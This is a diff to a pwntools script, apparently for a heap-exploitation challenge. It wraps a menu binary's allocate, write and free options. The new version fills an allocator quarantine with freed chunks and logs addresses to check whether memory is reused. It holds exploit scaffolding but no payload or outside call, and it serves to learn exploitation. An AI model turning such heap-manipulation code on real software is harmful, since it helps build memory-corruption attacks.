@@ -27,18 +27,19 @@ def start():
         return process(elf.path, env=env, stdin=PTY)
 
 # Select the "malloc" option, send size & data.
-def malloc(size, data):
+def malloc(size, data=None):
     io.send(b"1\n")
     io.sendafter(b"allocate: ", f"{size}\n".encode())
     chunk = io.recvline()
     index = chunk.split(b' ')[4]
     address = int(chunk.split(b' ')[7], 16)
-    io.sendafter(b"quit\n", b"3\n")
-    io.sendafter(b"address: ", b"2\n")
-    io.sendafter(b"address: ", f"{hex(address)}\n".encode())
-    io.sendafter(b"write: ", f"{len(data)}\n".encode())
-    io.sendafter(b"write: ", data)
-    io.send(b"\n")
+    if data:
+        io.sendafter(b"quit\n", b"3\n")
+        io.sendafter(b"address: ", b"2\n")
+        io.sendafter(b"address: ", f"{hex(address)}\n".encode())
+        io.sendafter(b"write: ", f"{len(data)}\n".encode())
+        io.sendafter(b"write: ", data)
+        io.send(b"\n")
     return (index, address)
 
 # Send the "free" option, send the address
@@ -56,7 +57,7 @@ def write(address, data):
     io.send(b"\n")
 
 def populate_quarantine():
-    for i in range(0x1000):
+    for i in range(200):
         free(malloc(0x20+i)[1])
     
 io = start()
@@ -68,16 +69,21 @@ io = start()
 
 # The malloc() function chooses option 1 and then 3 from the menu.
 # Its arguments are "size" and "data".
-ind1, add1 = malloc(24, b"Y"*24)
-ind2, add2 = malloc(24, b"X"*24)
+ind1, add1 = malloc(16, b"a"*16)
 
-write(add1, b"X"*12)
-write(add2, b"Y"*12)
+info(f"First address: {hex(add1)}")
 
 free(add1)
-free(add2)
+
+ind2, add2 = malloc(16, b"b"*16)
+
+info(f"Second address after first free: {hex(add2)}")
 
 populate_quarantine()
+
+ind3, add3 = malloc(16, b"c"*16)
+
+info(f"Third address after populate: {hex(add3)}")
 
 # =============================================================================
 
